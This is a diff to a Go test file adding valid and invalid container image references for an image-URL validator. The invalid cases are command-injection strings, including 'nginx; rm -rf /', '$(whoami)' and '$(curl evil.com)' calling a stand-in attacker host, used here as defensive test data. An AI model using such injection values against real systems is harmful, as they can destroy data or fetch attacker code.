@@ -60,6 +60,49 @@ func TestValidateImageURL(t *testing.T) {
 			t.Fatalf("expected ErrInvalidImage, got %v", err)
 		}
 	})
+
+	validRefs := []string{
+		"nginx",
+		"nginx:latest",
+		"ghcr.io/user/app:v1",
+		"docker.io/library/nginx:alpine",
+		"registry.example.com/org/image:sha256",
+		"debian:@tag@",
+		"myuser/myapp",
+		"quay.io/prometheus/node-exporter:v1.5.0",
+		"redis:7.0-alpine",
+	}
+	for _, ref := range validRefs {
+		t.Run("valid_format/"+ref, func(t *testing.T) {
+			if err := ValidateImageURL(ref); err != nil {
+				t.Fatalf("expected %q to be valid: %v", ref, err)
+			}
+		})
+	}
+
+	invalidRefs := []string{
+		"nginx; rm -rf /",
+		"image$(whoami)",
+		"image`id`",
+		"bad image",
+		"image\ttab",
+		"nginx:latest\nnewline",
+		"$(curl evil.com)",
+		";evil",
+	}
+	for _, ref := range invalidRefs {
+		label := strings.ReplaceAll(ref, "\n", "\\n")
+		label = strings.ReplaceAll(label, "\t", "\\t")
+		t.Run("invalid_format/"+label, func(t *testing.T) {
+			err := ValidateImageURL(ref)
+			if err == nil {
+				t.Fatalf("expected %q to be invalid", ref)
+			}
+			if !errors.Is(err, ErrInvalidImage) {
+				t.Fatalf("expected ErrInvalidImage, got %v", err)
+			}
+		})
+	}
 }
 
 func TestValidateEnvironmentKey(t *testing.T) {
